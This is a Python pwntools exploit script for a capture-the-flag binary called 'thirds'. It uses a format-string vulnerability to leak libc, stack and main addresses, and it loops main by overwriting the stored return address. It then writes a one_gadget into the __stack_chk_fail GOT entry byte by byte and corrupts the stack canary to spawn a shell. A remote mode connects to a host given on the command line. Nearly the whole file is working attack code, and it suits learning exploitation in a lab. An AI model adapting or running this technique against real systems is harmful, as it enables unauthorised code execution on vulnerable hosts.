#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./thirds_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main+232; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val, ssl=True)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)

io = start()
libc_leak = 15              # offset for return address to libc
stack_leak = libc_leak - 1  # offset for leaking the stack address
main_leak = 19              # offset containing the main address

# let's leak the libc address and the stack pointer
io.sendline(f"%{libc_leak}$p.%{stack_leak}$p".encode())

data = io.recvline()[3:-1].decode().split('.')
leak = int(data[0], 16)
stack = int(data[1], 16)

# all offsets calculated with my friend radare2 (we have an abusive relationship)
ret = stack - 152                           # address in the stack where the ret is stored
printf = leak + 215291                      # idk why pwntools trolls me and i've hardcoded the offset
libc.address = printf - libc.sym['printf']  # let's find the libc's base address
one_gadget = libc.address + 0xef0a6         # address of the one gadget to call system("/bin/sh")

success(f"----------")
success(f"libc leak        @ {hex(leak)}")
success(f"stack leak       @ {hex(stack)}")
success(f"----------")
success(f"libc base        @ {hex(libc.address)}")
success(f"----------")
success(f"one_gadget addr  @ {hex(one_gadget)}")
success(f"ret in stack     @ {hex(ret)}")
success(f"----------")
warning(f"The sun went supernova. Restarting the loop...")

io.sendline(p64(ret))       # let's store the stack pointer to ret address 
io.sendline(b"%63c%8$hhn")  # with offset 8 i can hit the stored address
io.recvline()               # this causes the start main func to restart the ELF

# in a new fresh main call
io.sendline(f"%{main_leak}$p".encode()) # lets leak the main address to access the GOT

data = io.recvline()[3:-1].decode()
main = int(data, 16)
exe.address = main - exe.sym['main']
sf = exe.got['__stack_chk_fail']
og_bytes = p64(one_gadget)

success(f"main             @ {hex(main)}")
success(f"main base        @ {hex(exe.address)}")
success(f"stack fail GOT   @ {hex(sf)}")
success(f"----------")

#loop agaaaain 
warning(f"22 minutes passed. End Times starts playing... Starting the loop again.")
io.sendline(p64(ret))
io.sendline(b"%63c%8$hhn")

'''
The program reads a max of 15 bytes per buffer, so here is the plan:
fgets puts a \0 byte at the end of the input, so I can use it to cut out a null byte 
for the addresses. 
Knowing that an address is 8 bytes, I can send 2 addresses to be stored on the stack per time.
The first one is the return address stack pointer, to cause the loop as before.
The second one is to write the one_gadget bytes into the __stack_chk_fail GOT.
When the four 2-byte writes are done, I can corrupt the canary to cause the function to be called.
'''

for i in range(6):
    warning(f"scrivo {og_bytes[i]} @ {hex(sf+i)}")
    token = p64(ret)+p64(sf+i)                          # return address pointer + __stack_chk_fail GOT pointer
    io.send(token[:15])                                 # I can cut the last null byte as mentioned and send without \n
    io.sendline(b"%63c%6$hhn")                          # cause another loop (outer wilds mentioned????)
    io.sendline(f"%{og_bytes[i]}c%7$hhn".encode())      # writing bytes in the GOT
    io.recvline()

canary_at = p64(ret-16)        # the canary is 16 bytes before the return
io.sendline(canary_at)         # lets store the canary pointer in the stack
io.sendline(b"%6767c%6$hn")    # lets brainrot the canary with 6767 to corrupt it
io.sendline(b"boom")           # sending the last input to cause the canary check
info("Enjoy the shell.")
io.recvlines(9)

# i used this to grep the flag from the garbage
'''io.sendline(b"cat flag")
data = io.recvregex(rb'gaslightCTF\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()'''
io.interactive() 